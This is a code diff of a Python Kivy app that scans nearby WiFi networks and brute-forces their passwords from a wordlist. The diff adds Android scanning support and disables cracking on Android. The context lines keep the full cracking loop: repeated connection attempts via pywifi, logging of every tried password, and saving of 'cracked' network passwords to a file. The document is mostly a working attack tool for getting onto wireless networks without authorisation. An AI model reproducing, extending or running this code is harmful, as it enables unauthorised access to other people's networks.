@@ -61,31 +61,25 @@ class WiFiScanner:
         self.attempted_passwords = set()
         self.running = True
         self.scan_results = []
+        self.android_wifi = False
         if "ANDROID_ARGUMENT" in os.environ:
             self.initialize_android_wifi()
         else:
             self.initialize_standard_wifi(interface_index)
     def initialize_android_wifi(self):
-        if not os.path.exists("/var/run/wpa_supplicant"):
-            self.log("WiFi scanning is not supported on Android in this environment.")
-            self.interface = None
-            return
-        if not PYWIFI_AVAILABLE:
-            self.log("pywifi not installed. Installing...")
-            self.install_pywifi()
-            return
         try:
-            self.wifi = pywifi.PyWiFi()
-            interfaces = self.wifi.interfaces()
-            if not interfaces:
-                self.log("No wireless interfaces found!")
-                return
-            self.log(f"Available wireless interfaces: {len(interfaces)}")
-            self.interface = interfaces[0]
-            self.log(f"Using interface: {self.interface.name()}")
+            from jnius import autoclass, cast
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            Context = autoclass('android.content.Context')
+            self.wifi_manager = cast('android.net.wifi.WifiManager', PythonActivity.mActivity.getSystemService(Context.WIFI_SERVICE))
+            if not self.wifi_manager.isWifiEnabled():
+                self.wifi_manager.setWifiEnabled(True)
+            self.android_wifi = True
             self.load_previous_attempts()
+            self.log("Android WiFi initialized successfully.")
         except Exception as e:
-            self.log(f"Error initializing WiFi on Android: {str(e)}")
+            self.log("Error initializing Android WiFi: " + str(e))
+            self.android_wifi = False
     def initialize_standard_wifi(self, interface_index):
         if platform.system() == "Linux" and not os.path.exists("/var/run/wpa_supplicant"):
             self.log("wpa_supplicant not found. Ensure it is installed and running.")
@@ -111,31 +105,23 @@ class WiFiScanner:
                 self.interface = interfaces[0]
             self.load_previous_attempts()
         except Exception as e:
-            self.log(f"Error initializing WiFi: {str(e)}")
-            if "PyWiFi only supports Linux and Windows platforms" in str(e):
-                self.log("This script works only on Windows and Linux.")
-            elif platform.system() == "Windows":
-                self.log("On Windows, ensure WLAN AutoConfig service is running.")
+            self.log("Error initializing WiFi: " + str(e))
     def install_pywifi(self):
         try:
             import subprocess
             self.log("Installing required dependencies...")
-            process = subprocess.Popen([sys.executable, "-m", "pip", "install", "pywifi"],
-                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen([sys.executable, "-m", "pip", "install", "pywifi"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             stdout, stderr = process.communicate()
             if process.returncode != 0:
-                self.log(f"Failed to install pywifi: {stderr.decode()}")
-                self.log("Install it manually: pip install pywifi")
+                self.log("Failed to install pywifi: " + stderr.decode())
                 return False
             if platform.system() == "Windows":
-                self.log("Installing comtypes for Windows...")
-                process = subprocess.Popen([sys.executable, "-m", "pip", "install", "comtypes"],
-                                             stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                process = subprocess.Popen([sys.executable, "-m", "pip", "install", "comtypes"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 process.communicate()
             self.log("Dependencies installed. Please restart the application.")
             return True
         except Exception as e:
-            self.log(f"Error installing dependencies: {str(e)}")
+            self.log("Error installing dependencies: " + str(e))
             return False
     def log(self, message):
         if self.status_callback:
@@ -148,7 +134,7 @@ class WiFiScanner:
                 with open(success_file, 'r') as f:
                     self.successful_attempts = json.load(f)
                 self.log(f"Loaded {len(self.successful_attempts)} previously cracked networks")
-            except (json.JSONDecodeError, IOError):
+            except Exception:
                 self.log("Could not read previous successful attempts")
         attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
         if os.path.exists(attempts_file):
@@ -159,7 +145,7 @@ class WiFiScanner:
                             network, password = line.strip().split('--', 1)
                             self.attempted_passwords.add(f"{network}--{password}")
                 self.log(f"Loaded {len(self.attempted_passwords)} previously attempted combinations")
-            except IOError:
+            except Exception:
                 self.log("Could not read previous attempt log")
     def save_successful_attempt(self, network, password):
         self.successful_attempts[network] = {"password": password, "timestamp": datetime.now().isoformat()}
@@ -167,7 +153,7 @@ class WiFiScanner:
         try:
             with open(success_file, 'w') as f:
                 json.dump(self.successful_attempts, f, indent=2)
-        except IOError:
+        except Exception:
             self.log("Could not save successful attempt")
     def log_attempt(self, network, password):
         attempt_key = f"{network}--{password}"
@@ -176,9 +162,11 @@ class WiFiScanner:
         try:
             with open(attempts_file, 'a') as f:
                 f.write(f"{attempt_key}\n")
-        except IOError:
+        except Exception:
             pass
     def scan_networks(self) -> List:
+        if self.android_wifi:
+            return self.scan_android_wifi()
         if not self.interface:
             self.log("No wireless interface available")
             return []
@@ -190,12 +178,10 @@ class WiFiScanner:
                     try:
                         self.interface.disconnect()
                         time.sleep(1)
-                    except:
+                    except Exception:
                         pass
             self.interface.scan()
             scan_wait_time = 4 if platform.system() == "Windows" else 2
-            if "ANDROID_ARGUMENT" in os.environ:
-                scan_wait_time = 6
             self.log(f"Waiting {scan_wait_time} seconds for scan to complete...")
             time.sleep(scan_wait_time)
             seen_ssids = set()
@@ -217,16 +203,35 @@ class WiFiScanner:
                             network.ssid = f"<Hidden Network: {network.bssid}>"
                             unique_networks.append(network)
             except Exception as e:
-                self.log(f"Error getting scan results: {str(e)}")
-                if platform.system() == "Windows":
-                    self.log("WLAN service may not be responding.")
+                self.log("Error getting scan results: " + str(e))
                 return []
             self.scan_results = unique_networks
             return unique_networks
         except Exception as e:
-            self.log(f"Error during network scan: {str(e)}")
+            self.log("Error during network scan: " + str(e))
+            return []
+    def scan_android_wifi(self):
+        try:
+            self.wifi_manager.startScan()
+            time.sleep(4)
+            results = self.wifi_manager.getScanResults()
+            networks = []
+            for result in results.toArray():
+                ssid = result.SSID
+                bssid = result.BSSID
+                level = result.level
+                net = type('Network', (), {})()
+                net.ssid = ssid if ssid and ssid.strip() != "" else f"<Hidden Network: {bssid}>"
+                net.signal = level
+                networks.append(net)
+            return networks
+        except Exception as e:
+            self.log("Error scanning Android WiFi: " + str(e))
             return []
     def test_password(self, network, password, timeout=TIMEOUT_SECONDS) -> bool:
+        if self.android_wifi:
+            self.log("Password testing is not supported on Android.")
+            return False
         attempt_key = f"{network.ssid}--{password}"
         if attempt_key in self.attempted_passwords:
             return False
@@ -253,7 +258,7 @@ class WiFiScanner:
             try:
                 self.interface.remove_all_network_profiles()
             except Exception as e:
-                self.log(f"Warning: Could not remove profiles: {str(e)}")
+                self.log("Warning: Could not remove profiles: " + str(e))
             try:
                 temp_profile = self.interface.add_network_profile(profile)
             except Exception as e:
@@ -268,15 +273,15 @@ class WiFiScanner:
                     try:
                         temp_profile = self.interface.add_network_profile(profile)
                     except Exception as inner_e:
-                        self.log(f"Error creating profile: {str(inner_e)}")
+                        self.log("Error creating profile: " + str(inner_e))
                         return False
                 else:
-                    self.log(f"Error adding profile: {str(e)}")
+                    self.log("Error adding profile: " + str(e))
                     return False
             try:
                 self.interface.connect(temp_profile)
             except Exception as e:
-                self.log(f"Error connecting: {str(e)}")
+                self.log("Error connecting: " + str(e))
                 return False
             start_time = time.time()
             connection_successful = False
@@ -289,27 +294,30 @@ class WiFiScanner:
                     elif status == const.IFACE_DISCONNECTED:
                         break
                 except Exception as e:
-                    self.log(f"Error checking status: {str(e)}")
+                    self.log("Error checking status: " + str(e))
                     break
                 time.sleep(0.5)
             try:
                 self.interface.disconnect()
             except Exception as e:
-                self.log(f"Error disconnecting: {str(e)}")
+                self.log("Error disconnecting: " + str(e))
             if connection_successful:
-                self.log(f"Successfully connected with password: {password}")
+                self.log("Successfully connected with password: " + password)
                 time.sleep(1)
             return connection_successful
         except Exception as e:
-            self.log(f"Error during password attempt: {str(e)}")
+            self.log("Error during password attempt: " + str(e))
             try:
                 self.interface.disconnect()
-            except:
+            except Exception:
                 pass
             return False
     def crack_network(self, network, passwords: List[str], progress_callback=None):
+        if self.android_wifi:
+            self.log("Cracking is not supported on Android.")
+            return False, None
         if network.ssid in self.successful_attempts:
-            self.log(f"Network {network.ssid} already cracked: {self.successful_attempts[network.ssid]['password']}")
+            self.log("Network " + network.ssid + " already cracked: " + self.successful_attempts[network.ssid]['password'])
             return True, self.successful_attempts[network.ssid]['password']
         total_passwords = len(passwords)
         for i, password in enumerate(passwords):
@@ -317,10 +325,10 @@ class WiFiScanner:
                 progress_callback(i + 1, total_passwords, password)
             if len(password) < 8 or not all(32 <= ord(ch) < 127 for ch in password):
                 continue
-            self.log(f"Trying {network.ssid} with password: {password} ({i + 1}/{total_passwords})")
+            self.log("Trying " + network.ssid + " with password: " + password + " (" + str(i + 1) + "/" + str(total_passwords) + ")")
             time.sleep(1)
             if self.test_password(network, password):
-                self.log(f"PASSWORD FOUND for {network.ssid}: {password}")
+                self.log("PASSWORD FOUND for " + network.ssid + ": " + password)
                 self.save_successful_attempt(network.ssid, password)
                 return True, password
             if not self.running:
@@ -457,7 +465,7 @@ class WiFiCrackApp(App):
         wordlist_box.add_widget(upload_btn)
         self.root.add_widget(wordlist_box)
         button_box = BoxLayout(orientation='horizontal', size_hint_y=None, height=60, spacing=20)
-        self.crack_button = Button(text='Start Cracking', disabled=True, background_color=get_color_from_hex(Colors.GREEN), font_size='20sp')
+        self.crack_button = Button(text='Start Cracking', disabled=(True if "ANDROID_ARGUMENT" in os.environ else False), background_color=get_color_from_hex(Colors.GREEN), font_size='20sp')
         self.crack_button.bind(on_release=self.on_crack_pressed)
         button_box.add_widget(self.crack_button)
         self.stop_button = Button(text='Stop', disabled=True, background_color=get_color_from_hex(Colors.RED), font_size='20sp')
@@ -483,23 +491,23 @@ class WiFiCrackApp(App):
     def file_chosen(self, selection, popup):
         if selection:
             self.wordlist_input.text = selection[0]
-            self.log(f"Selected wordlist: {selection[0]}")
+            self.log("Selected wordlist: " + selection[0])
         popup.dismiss()
     def on_log_size(self, instance, value):
         instance.text_size = (value[0], None)
         instance.height = max(instance.texture_size[1], 200)
     def log(self, message):
         def update_log(dt):
-            self.log_output.text += f"\n[{datetime.now().strftime('%H:%M:%S')}] {message}"
+            self.log_output.text += "\n[" + datetime.now().strftime('%H:%M:%S') + "] " + message
             self.log_scroll.scroll_y = 0
         Clock.schedule_once(update_log, 0)
     def on_scan_pressed(self, instance):
         if self.is_scanning:
             return
-        if not PYWIFI_AVAILABLE:
+        if not PYWIFI_AVAILABLE and not ("ANDROID_ARGUMENT" in os.environ):
             self.show_error_popup("PyWiFi not available", "Required dependencies not installed. Restart after installation.")
             return
-        if not self.scanner or not self.scanner.interface:
+        if not self.scanner or (not self.scanner.interface and not self.scanner.android_wifi):
             self.show_error_popup("No WiFi Interface", "No wireless interface found. Ensure WiFi is enabled.")
             return
         self.is_scanning = True
@@ -520,16 +528,17 @@ class WiFiCrackApp(App):
             self.log("No networks found.")
             self.status_label.text = "No networks found"
         else:
-            self.log(f"Found {len(networks)} networks.")
-            self.status_label.text = f"Found {len(networks)} networks"
+            self.log("Found " + str(len(networks)) + " networks.")
+            self.status_label.text = "Found " + str(len(networks)) + " networks"
             for network in networks:
                 network_item = NetworkItem(network)
                 if network.ssid in self.scanner.successful_attempts:
                     password = self.scanner.successful_attempts[network.ssid]['password']
-                    network_item.set_status(f"Cracked: {password}", True)
+                    network_item.set_status("Cracked: " + password, True)
                 self.networks_grid.add_widget(network_item)
                 self.network_items.append(network_item)
-            self.crack_button.disabled = False
+            if "ANDROID_ARGUMENT" not in os.environ:
+                self.crack_button.disabled = False
         self.is_scanning = False
         self.scan_button.disabled = False
     def load_passwords(self):
@@ -537,13 +546,13 @@ class WiFiCrackApp(App):
         try:
             with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                 passwords = [line.strip() for line in f if line.strip()]
-            self.log(f"Loaded {len(passwords)} passwords from {wordlist_path}")
+            self.log("Loaded " + str(len(passwords)) + " passwords from " + wordlist_path)
             return passwords
         except FileNotFoundError:
-            self.show_error_popup("File Not Found", f"Wordlist file '{wordlist_path}' not found")
+            self.show_error_popup("File Not Found", "Wordlist file '" + wordlist_path + "' not found")
             return []
         except IOError:
-            self.show_error_popup("File Error", f"Error reading wordlist file '{wordlist_path}'")
+            self.show_error_popup("File Error", "Error reading wordlist file '" + wordlist_path + "'")
             return []
     def on_crack_pressed(self, instance):
         selected_networks = [item for item in self.network_items if item.selected]
@@ -568,11 +577,11 @@ class WiFiCrackApp(App):
     def update_cracking_progress(self, network, current, total, password):
         for item in self.network_items:
             if item.network.ssid == network.ssid:
-                item.set_status(f"Testing: {password} ({current}/{total})", False)
+                item.set_status("Testing: " + password + " (" + str(current) + "/" + str(total) + ")", False)
     def update_network_item_success(self, network, password):
         for item in self.network_items:
             if item.network.ssid == network.ssid:
-                item.set_status(f"Cracked: {password}", True)
+                item.set_status("Cracked: " + password, True)
     def update_network_item_failure(self, network):
         for item in self.network_items:
             if item.network.ssid == network.ssid:
